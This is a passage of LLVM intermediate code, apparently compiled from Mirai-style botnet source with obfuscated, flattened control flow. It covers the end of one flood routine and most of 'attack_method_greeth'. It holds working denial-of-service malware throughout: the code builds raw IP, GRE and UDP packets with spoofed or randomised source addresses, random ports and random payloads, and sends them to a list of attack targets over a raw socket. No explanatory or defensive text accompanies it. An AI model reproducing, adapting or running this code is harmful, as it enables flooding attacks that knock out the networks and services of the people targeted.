  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  store i32 -403980106, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 8
  %223 = load i32, i32* %222, align 4
  %224 = sub i32 %223, 1024
  %225 = xor i32 %224, -1
  %226 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  store i32 -403980106, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load i16, i16* %16, align 2
  %230 = call zeroext i16 @htons(i16 zeroext %229) #7
  %231 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %232 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %231, i32 0, i32 0
  store i16 %230, i16* %232, align 2
  %233 = load i16, i16* %17, align 2
  %234 = call zeroext i16 @htons(i16 zeroext %233) #7
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 1
  store i16 %234, i16* %236, align 2
  %237 = load i32, i32* %18, align 4
  %238 = sext i32 %237 to i64
  %239 = add i64 8, %238
  %240 = trunc i64 %239 to i16
  %241 = call zeroext i16 @htons(i16 zeroext %240) #7
  %242 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 2
  store i16 %241, i16* %243, align 2
  store i32 -1739833981, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i32, i32* %9, align 4
  %246 = add nsw i32 %245, 1
  store i32 %246, i32* %9, align 4
  store i32 1194510270, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  store i32 -545389281, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 931426249, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i32, i32* %9, align 4
  %251 = load i8, i8* %5, align 1
  %252 = zext i8 %251 to i32
  %253 = icmp slt i32 %250, %252
  %254 = select i1 %253, i32 927521685, i32 2058167161
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i8**, i8*** %11, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds i8*, i8** %256, i64 %258
  %260 = load i8*, i8** %259, align 8
  store i8* %260, i8** %26, align 8
  %261 = load i8*, i8** %26, align 8
  %262 = bitcast i8* %261 to %struct.iphdr*
  store %struct.iphdr* %262, %struct.iphdr** %27, align 8
  %263 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i64 1
  %265 = bitcast %struct.iphdr* %264 to %struct.grehdr*
  store %struct.grehdr* %265, %struct.grehdr** %28, align 8
  %266 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %267 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %266, i64 1
  %268 = bitcast %struct.grehdr* %267 to %struct.iphdr*
  store %struct.iphdr* %268, %struct.iphdr** %29, align 8
  %269 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i64 1
  %271 = bitcast %struct.iphdr* %270 to %struct.udphdr*
  store %struct.udphdr* %271, %struct.udphdr** %30, align 8
  %272 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %273 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %272, i64 1
  %274 = bitcast %struct.udphdr* %273 to i8*
  store i8* %274, i8** %31, align 8
  %275 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %276 = load i32, i32* %9, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 2
  %280 = load i8, i8* %279, align 4
  %281 = zext i8 %280 to i32
  %282 = icmp slt i32 %281, 32
  %283 = select i1 %282, i32 702209612, i32 -1091992897
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 1
  %290 = load i32, i32* %289, align 4
  %291 = call i32 @ntohl(i32 %290) #7
  %292 = call i32 @rand_next()
  %293 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = lshr i32 %292, %299
  %301 = add i32 %291, %300
  %302 = call i32 @htonl(i32 %301) #7
  %303 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 9
  store i32 %302, i32* %304, align 4
  store i32 -1091992897, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i32, i32* %21, align 4
  %307 = icmp eq i32 %306, -1
  %308 = select i1 %307, i32 1227524933, i32 1771241489
  store i32 %308, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = call i32 @rand_next()
  %311 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 8
  store i32 %310, i32* %312, align 4
  store i32 1771241489, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = load i16, i16* %13, align 2
  %315 = zext i16 %314 to i32
  %316 = icmp eq i32 %315, 65535
  %317 = select i1 %316, i32 -1312038723, i32 -588745701
  store i32 %317, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = call i32 @rand_next()
  %320 = and i32 %319, 65535
  %321 = trunc i32 %320 to i16
  %322 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 3
  store i16 %321, i16* %323, align 4
  %324 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 3
  %326 = load i16, i16* %325, align 4
  %327 = zext i16 %326 to i32
  %328 = sub nsw i32 %327, 1000
  %329 = xor i32 %328, -1
  %330 = trunc i32 %329 to i16
  %331 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 3
  store i16 %330, i16* %332, align 4
  store i32 -588745701, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i16, i16* %16, align 2
  %335 = zext i16 %334 to i32
  %336 = icmp eq i32 %335, 65535
  %337 = select i1 %336, i32 -1028033286, i32 566621988
  store i32 %337, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = call i32 @rand_next()
  %340 = and i32 %339, 65535
  %341 = trunc i32 %340 to i16
  %342 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %343 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %342, i32 0, i32 0
  store i16 %341, i16* %343, align 2
  store i32 566621988, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i16, i16* %17, align 2
  %346 = zext i16 %345 to i32
  %347 = icmp eq i32 %346, 65535
  %348 = select i1 %347, i32 699642041, i32 1371512185
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = call i32 @rand_next()
  %351 = and i32 %350, 65535
  %352 = trunc i32 %351 to i16
  %353 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i32 0, i32 1
  store i16 %352, i16* %354, align 2
  store i32 1371512185, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i8, i8* %20, align 1
  %357 = icmp ne i8 %356, 0
  %358 = select i1 %357, i32 406136144, i32 -227996643
  store i32 %358, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = call i32 @rand_next()
  %361 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %362 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %361, i32 0, i32 9
  store i32 %360, i32* %362, align 4
  store i32 174353573, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %365 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %364, i32 0, i32 9
  %366 = load i32, i32* %365, align 4
  %367 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i32 0, i32 9
  store i32 %366, i32* %368, align 4
  store i32 174353573, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i8, i8* %19, align 1
  %371 = icmp ne i8 %370, 0
  %372 = select i1 %371, i32 -1518783782, i32 786831969
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = load i8*, i8** %31, align 8
  %375 = load i32, i32* %18, align 4
  call void @rand_str(i8* %374, i32 %375)
  store i32 786831969, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 7
  store i16 0, i16* %378, align 2
  %379 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %380 = bitcast %struct.iphdr* %379 to i16*
  %381 = call zeroext i16 @checksum_generic(i16* %380, i32 20)
  %382 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 %381, i16* %383, align 2
  %384 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 7
  store i16 0, i16* %385, align 2
  %386 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %387 = bitcast %struct.iphdr* %386 to i16*
  %388 = call zeroext i16 @checksum_generic(i16* %387, i32 20)
  %389 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 7
  store i16 %388, i16* %390, align 2
  %391 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %392 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %391, i32 0, i32 3
  store i16 0, i16* %392, align 2
  %393 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %394 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %395 = bitcast %struct.udphdr* %394 to i8*
  %396 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %397 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %396, i32 0, i32 2
  %398 = load i16, i16* %397, align 2
  %399 = load i32, i32* %18, align 4
  %400 = sext i32 %399 to i64
  %401 = add i64 8, %400
  %402 = trunc i64 %401 to i32
  %403 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %393, i8* %395, i16 zeroext %398, i32 %402)
  %404 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %405 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %404, i32 0, i32 3
  store i16 %403, i16* %405, align 2
  %406 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %407 = load i32, i32* %9, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 0
  %411 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %410, i32 0, i32 0
  store i16 2, i16* %411, align 4
  %412 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 9
  %414 = load i32, i32* %413, align 4
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 2
  %421 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %420, i32 0, i32 0
  store i32 %414, i32* %421, align 4
  %422 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %423 = load i32, i32* %9, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %425, i32 0, i32 0
  %427 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %426, i32 0, i32 1
  store i16 0, i16* %427, align 2
  %428 = load i32, i32* %10, align 4
  %429 = load i8*, i8** %26, align 8
  %430 = load i32, i32* %18, align 4
  %431 = sext i32 %430 to i64
  %432 = add i64 52, %431
  %433 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %434 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %435 = load i32, i32* %9, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i64 %436
  %438 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i32 0, i32 0
  %439 = bitcast %struct.sockaddr_in* %438 to %struct.sockaddr*
  store %struct.sockaddr* %439, %struct.sockaddr** %433, align 8
  %440 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %441 = load %struct.sockaddr*, %struct.sockaddr** %440, align 8
  %442 = call i64 @sendto(i32 %428, i8* %429, i64 %432, i32 16384, %struct.sockaddr* %441, i32 16)
  store i32 1090740823, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load i32, i32* %9, align 4
  %445 = add nsw i32 %444, 1
  store i32 %445, i32* %9, align 4
  store i32 931426249, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  store i32 -545389281, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %446, %443, %376, %373, %369, %363, %359, %355, %349, %344, %338, %333, %318, %313, %309, %305, %284, %255, %249, %248, %247, %244, %228, %220, %214, %205, %201, %151, %147, %96, %90, %89, %86, %80, %79, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -938488888, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -938488888, label %first
    i32 1794788802, label %87
    i32 -1760216375, label %88
    i32 -2030163597, label %94
    i32 -913860933, label %97
    i32 1014391780, label %98
    i32 -254884608, label %104
    i32 65049026, label %158
    i32 -1343681387, label %162
    i32 1761561898, label %215
    i32 1046759815, label %219
    i32 1650244553, label %228
    i32 2047238626, label %234
    i32 -334667144, label %242
    i32 1603919363, label %258
    i32 -37338091, label %261
    i32 -2104106592, label %262
    i32 -488097294, label %263
    i32 690669722, label %269
    i32 1665774889, label %301
    i32 -12268529, label %322
    i32 274299786, label %326
    i32 -704048595, label %330
    i32 833236925, label %335
    i32 772699391, label %350
    i32 -1578804232, label %355
    i32 -34645880, label %361
    i32 -672366990, label %366
    i32 1881391771, label %372
    i32 -938376794, label %376
    i32 1825325296, label %380
    i32 -710691380, label %386
    i32 2143645345, label %412
    i32 -1884505602, label %415
    i32 62195668, label %482
    i32 -1353627716, label %485
    i32 1944325231, label %486
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %85 = icmp eq i32 %.reload, -1
  %86 = select i1 %85, i32 1794788802, i32 -1760216375
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 1944325231, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %89 = load i32, i32* %10, align 4
  %90 = bitcast i32* %9 to i8*
  %91 = call i32 @setsockopt(i32 %89, i32 0, i32 3, i8* %90, i32 4) #6
  %92 = icmp eq i32 %91, -1
  %93 = select i1 %92, i32 -2030163597, i32 -913860933
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %10, align 4
  %96 = call i32 @close(i32 %95)
  store i32 1944325231, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1014391780, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %9, align 4
  %100 = load i8, i8* %5, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %99, %101
  %103 = select i1 %102, i32 -254884608, i32 -37338091
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %106 = load i8**, i8*** %11, align 8
  %107 = load i32, i32* %9, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8*, i8** %106, i64 %108
  store i8* %105, i8** %109, align 8
  %110 = load i8**, i8*** %11, align 8
  %111 = load i32, i32* %9, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8*, i8** %110, i64 %112
  %114 = load i8*, i8** %113, align 8
  %115 = bitcast i8* %114 to %struct.iphdr*
  store %struct.iphdr* %115, %struct.iphdr** %22, align 8
  %116 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i64 1
  %118 = bitcast %struct.iphdr* %117 to %struct.grehdr*
  store %struct.grehdr* %118, %struct.grehdr** %23, align 8
  %119 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %120 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %119, i64 1
  %121 = bitcast %struct.grehdr* %120 to %struct.ethhdr*
  store %struct.ethhdr* %121, %struct.ethhdr** %24, align 8
  %122 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %123 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %122, i64 1
  %124 = bitcast %struct.ethhdr* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %25, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.udphdr*
  store %struct.udphdr* %127, %struct.udphdr** %26, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %129 = bitcast %struct.iphdr* %128 to i8*
  %130 = load i8, i8* %129, align 4
  %131 = and i8 %130, 15
  %132 = or i8 %131, 64
  store i8 %132, i8* %129, align 4
  %133 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = and i8 %135, -16
  %137 = or i8 %136, 5
  store i8 %137, i8* %134, align 4
  %138 = load i8, i8* %12, align 1
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 1
  store i8 %138, i8* %140, align 1
  %141 = load i32, i32* %18, align 4
  %142 = sext i32 %141 to i64
  %143 = add i64 66, %142
  %144 = trunc i64 %143 to i16
  %145 = call zeroext i16 @htons(i16 zeroext %144) #7
  %146 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %147 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %146, i32 0, i32 2
  store i16 %145, i16* %147, align 2
  %148 = load i16, i16* %13, align 2
  %149 = call zeroext i16 @htons(i16 zeroext %148) #7
  %150 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 3
  store i16 %149, i16* %151, align 4
  %152 = load i8, i8* %14, align 1
  %153 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 5
  store i8 %152, i8* %154, align 4
  %155 = load i8, i8* %15, align 1
  %156 = icmp ne i8 %155, 0
  %157 = select i1 %156, i32 65049026, i32 -1343681387
  store i32 %157, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 4
  store i16 %159, i16* %161, align 2
  store i32 -1343681387, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 6
  store i8 47, i8* %164, align 1
  %165 = load i32, i32* %21, align 4
  %166 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 8
  store i32 %165, i32* %167, align 4
  %168 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i32 0, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 9
  store i32 %173, i32* %175, align 4
  %176 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %177 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %178 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %177, i32 0, i32 1
  store i16 %176, i16* %178, align 2
  %179 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %180 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %181 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %180, i32 0, i32 2
  store i16 %179, i16* %181, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %183 = bitcast %struct.iphdr* %182 to i8*
  %184 = load i8, i8* %183, align 4
  %185 = and i8 %184, 15
  %186 = or i8 %185, 64
  store i8 %186, i8* %183, align 4
  %187 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %188 = bitcast %struct.iphdr* %187 to i8*
  %189 = load i8, i8* %188, align 4
  %190 = and i8 %189, -16
  %191 = or i8 %190, 5
  store i8 %191, i8* %188, align 4
  %192 = load i8, i8* %12, align 1
  %193 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 1
  store i8 %192, i8* %194, align 1
  %195 = load i32, i32* %18, align 4
  %196 = sext i32 %195 to i64
